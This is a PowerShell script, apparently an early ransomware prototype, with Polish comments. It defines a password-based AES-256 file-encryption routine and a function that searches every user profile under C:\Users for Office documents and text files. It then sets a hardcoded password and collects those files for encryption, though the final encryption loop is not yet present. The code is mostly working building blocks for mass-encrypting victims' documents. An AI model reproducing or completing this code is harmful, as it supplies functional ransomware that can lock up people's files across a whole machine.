function Encrypt-FileAES256 {
 
    param(
 
        [Parameter(Mandatory=$true)]
 
        [string]$InputFile,
 
       
 
        [Parameter(Mandatory=$true)]
 
        [string]$OutputFile,
 
       
 
        [Parameter(Mandatory=$true)]
 
        [string]$Password
 
    )
 
   
 
    $salt = New-Object byte[] 16
 
    [System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($salt)
 
   
 
    $deriveBytes = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($Password, $salt, 10000)
 
    $key = $deriveBytes.GetBytes(32)  #klucz
 
    $iv = $deriveBytes.GetBytes(16)   # wektor inicjujÄ…cy
 
   
 
    # AES parametry
 
    $aes = [System.Security.Cryptography.AesManaged]::Create()
 
    $aes.KeySize = 256
 
    $aes.BlockSize = 128
 
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
 
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
 
    $aes.Key = $key
 
    $aes.IV = $iv
 
   
 
    $fsOut = [System.IO.File]::Open($OutputFile, [System.IO.FileMode]::Create)
 
    $fsOut.Write($salt, 0, $salt.Length)
 
   
 
    $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($fsOut, $aes.CreateEncryptor(), [System.Security.Cryptography.CryptoStreamMode]::Write)
 
    $fsIn = [System.IO.File]::OpenRead($InputFile)
 
    $buffer = New-Object byte[] 4096
 
    while (($bytesRead = $fsIn.Read($buffer, 0, $buffer.Length)) -gt 0)
 
    {
 
        $cryptoStream.Write($buffer, 0, $bytesRead)
 
    }
 
   
 
    $cryptoStream.FlushFinalBlock()
 
    $cryptoStream.Close()
 
    $fsIn.Close()
 
    $fsOut.Close()
 
   
 
    Write-Output "File '$InputFile' '$OutputFile' ENCRYPTED"
 
}
 
 
function Find-UserFiles
 
{
 
    $userRoot = "C:\Users"
 
    $excludeDirs = @("All Users", "Default", "Default User", "Public")
 
    $foundFiles = @()
 
    $extensions = @("*.docx", "*.xlsx", "*.pptx", "*.txt")
 
   
    Write-Host "Name: $_.Name"
 
    $dirs = Get-ChildItem -Path $userRoot -Directory | Where-Object { $excludeDirs -notcontains $_.Name }
 
    Write-Host "Analyze $dirs"
   
 
    foreach ($dir in $dirs) {
        
        Write-Host "Checking $dir"
 
        foreach ($ext in $extensions) {

            Write-Host "Checking for $ext"
 
            $files = Get-ChildItem -Path "C:\Users\$dir" -Recurse -Filter $ext -ErrorAction SilentlyContinue
 
            $foundFiles += $files
 
        }
 
    }
 
   
 
    return $foundFiles
 
}
 
 
$password = "MojeSuperTajneHaslo"
 
$filesToEncrypt = Find-UserFiles

Write-Host "Show file to encrypt: $filesToEncrypt"

Write-Output "END"
